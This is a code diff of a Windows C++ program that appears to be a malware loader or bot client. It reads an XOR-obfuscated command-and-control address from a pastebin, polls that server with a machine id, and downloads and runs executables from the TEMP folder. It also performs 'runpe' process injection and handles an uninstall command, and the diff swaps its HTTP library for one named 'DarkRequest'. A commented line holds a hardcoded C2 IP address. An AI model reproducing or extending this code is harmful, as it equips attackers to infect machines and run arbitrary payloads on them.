@@ -1,7 +1,6 @@
 #include <stdio.h>
 #include <iostream>
 #include <fstream>
-#include "HTTPRequest.hpp"
 #include <windows.h>
 #include <Urlmon.h> 
 #include <time.h>
@@ -13,14 +12,17 @@
 #include "config.h"
 #include <conio.h>
 #include "obfuscat.h"
+#include "URL.h"
 #include <atlbase.h>
 #include <wtypes.h>
 #include <comutil.h>
 #include "Helpers.hpp"
 #include "OsHelpers.hpp"
+#include "DarkRequest.h"
 #include "XOR.h"
 #include "spiderrun.h"
 #include "Client.h"
+
 
 #pragma comment(lib,"comsuppw.lib")
 #pragma comment( lib, "Urlmon.lib" )
@@ -67,10 +69,13 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char*, int nShowCmd) {
 
 	
 		//Fetch Gate from raw Site
-		http::Request request(config.pastebinUrl);
-		http::Response response = request.send(OBFUSCATE("GET"));
-		std::string gateFromPatebin = XOR::encryptDecrypt(Helpers::responseToString(response));
 	
+
+		std::string gateFromPatebin = XOR::encryptDecrypt(postRequest(config.pastebinUrl,"","GET"));
+		
+		//std::string gateFromPatebin = "http://35.204.128.99/request";
+		
+		//std::cout << gateFromPatebin;
 
 
 		//Main
@@ -80,9 +85,10 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char*, int nShowCmd) {
 		//std::cout << "\n\n======";
 		while (true) {
 			try {
-
-				std::string responseFromGate = Client::sendPost(gateFromPatebin, finalPost);
-				//std::cout << responseFromGate;
+				std::cout << gateFromPatebin;
+				std::string responseFromGate = postRequest(gateFromPatebin, finalPost,"POST");
+				//std::string responseFromGate2 = postRequest(gateFromPatebin, finalPost,"POST");
+				std::cout << responseFromGate;
 				if (responseFromGate.find(OBFUSCATE("dande")) != std::string::npos) {
 					std::vector<std::string> v = Helpers::explode(";", responseFromGate);
 					std::string random_str = Helpers::RandomString(10);
@@ -90,7 +96,8 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char*, int nShowCmd) {
 					std::string file((std::string)getenv(OBFUSCATE("TEMP")) + "\\" + random_str + OBFUSCATE(".exe"));
 					Helpers::downloadFile(url, file);
 					std::string started = Helpers::startNewProcess(file);
-					Client::sendPost(gateFromPatebin, "hwid=" + guid + "&taskstatus=" + started + "&taskid=" + v[0]);
+					
+					postRequest(gateFromPatebin, "hwid=" + guid + "&taskstatus=" + started + "&taskid=" + v[0], "POST");
 				}else if (responseFromGate.find(OBFUSCATE("runpe")) != std::string::npos) {
 						std::vector<std::string> v = Helpers::explode(";", responseFromGate);
 						std::string url(v[2]);
@@ -100,7 +107,7 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char*, int nShowCmd) {
 						if(runned){
 							 started = OBFUSCATE("success");
 						}
-						Client::sendPost(gateFromPatebin, "hwid=" + guid + "&taskstatus=" + started + "&taskid=" + v[0]);
+						postRequest(gateFromPatebin, "hwid=" + guid + "&taskstatus=" + started + "&taskid=" + v[0], "POST");
 					}
 				else {
 					if (responseFromGate.find(OBFUSCATE("uninstall")) != std::string::npos) {
